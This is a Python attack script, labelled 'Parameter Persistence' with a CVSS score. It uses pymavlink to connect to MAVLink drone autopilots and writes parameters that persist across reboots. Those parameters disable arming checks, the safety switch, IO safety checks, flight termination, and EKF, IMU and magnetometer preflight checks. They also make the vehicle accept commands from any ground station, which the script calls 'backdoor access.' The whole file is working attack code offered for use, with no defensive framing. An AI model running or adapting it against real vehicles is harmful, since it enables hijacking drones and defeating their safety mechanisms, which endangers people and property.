#!/usr/bin/env python3
"""
Parameter Persistence
Modify parameters to maintain persistent access and control

Modifies critical system parameters that persist across reboots
to maintain backdoor access and bypass safety mechanisms.

CVSS Score: 7.0 (High)
Affected: All MAVLink-compatible autopilots
"""

import sys
import time
from pymavlink import mavutil

def establish_parameter_persistence(connection_string):
    """
    Modify parameters for persistent backdoor access
    
    Args:
        connection_string: MAVLink connection string
    """
    try:
        print("[*] Parameter Persistence Attack")
        print(f"[*] Connecting to {connection_string}...")
        
        master = mavutil.mavlink_connection(connection_string)
        master.wait_heartbeat()
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print("[*] Modifying persistent parameters...")
        
        # Critical parameters that persist and enable backdoor access
        persistence_params = {
            # GCS and communication
            'SYSID_MYGCS': 255,  # Accept commands from any GCS
            'SERIAL1_BAUD': 57600,  # Enable serial communication
            'SERIAL1_PROTOCOL': 2,  # MAVLink protocol
            
            # Safety bypasses
            'ARMING_CHECK': 0,  # Disable all arming checks
            'COM_ARM_WO_GPS': 1,  # Allow arming without GPS
            'COM_ARM_SWISBTN_REQ': 0,  # Disable safety switch requirement
            'CBRK_IO_SAFETY': 22027,  # Disable IO safety checks
            'CBRK_FLIGHTTERM': 121212,  # Disable flight termination
            
            # Preflight check bypasses
            'COM_ARM_EKF_AB': 0,  # Disable EKF attitude bias checks
            'COM_ARM_EKF_GB': 0,  # Disable EKF gyro bias checks
            'COM_ARM_EKF_POS': 0,  # Disable EKF position checks
            'COM_ARM_EKF_VEL': 0,  # Disable EKF velocity checks
            'COM_ARM_EKF_HGT': 0,  # Disable EKF height checks
            'COM_ARM_EKF_YAW': 0,  # Disable EKF yaw checks
            'COM_ARM_IMU_ACC': 0,  # Disable IMU accelerometer checks
            'COM_ARM_IMU_GYR': 0,  # Disable IMU gyroscope checks
            'COM_ARM_MAG_STR': 0,  # Disable magnetometer strength checks
            'COM_ARM_MAG_ANG': 0,  # Disable magnetometer angle checks
            
            # Mission and waypoint
            'MIS_TAKEOFF_ALT': 10.0,  # Set low takeoff altitude
            'RTL_ALT': 50.0,  # Set return altitude
            
            # Communication
            'COM_RC_IN_MODE': 1,  # Enable RC input
            'COM_ARM_CHK_ESCS': 0,  # Disable ESC checks
        }
        
        modified_count = 0
        failed_count = 0
        
        for param_name, param_value in persistence_params.items():
            try:
                print(f"[*] Setting {param_name} = {param_value}...")
                master.mav.param_set_send(
                    target_system,
                    target_component,
                    param_name.encode('utf-8'),
                    param_value,
                    mavutil.mavlink.MAV_PARAM_TYPE_UINT32 if isinstance(param_value, int) else mavutil.mavlink.MAV_PARAM_TYPE_REAL32
                )
                time.sleep(0.2)
                
                # Verify parameter was set
                master.mav.param_request_read_send(
                    target_system,
                    target_component,
                    param_name.encode('utf-8'),
                    -1
                )
                time.sleep(0.1)
                
                modified_count += 1
                print(f"[+] Parameter modified: {param_name}")
            except Exception as e:
                failed_count += 1
                print(f"[-] Failed to set {param_name}: {e}")
        
        print()
        print(f"[+] Parameter persistence established")
        print(f"    Modified: {modified_count} parameters")
        print(f"    Failed: {failed_count} parameters")
        print("[!] These parameters will persist across reboots")
        print("[!] Backdoor access maintained even after system restart")
        
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 parameter_persistence.py <connection>")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("\nExamples:")
        print("  python3 parameter_persistence.py udp:127.0.0.1:14550")
        print("\nParameter Persistence")
        print("CVSS Score: 7.0 (High)")
        print("Affected: All MAVLink-compatible autopilots")
        sys.exit(1)
    
    connection = sys.argv[1]
    establish_parameter_persistence(connection)

if __name__ == "__main__":
    main()
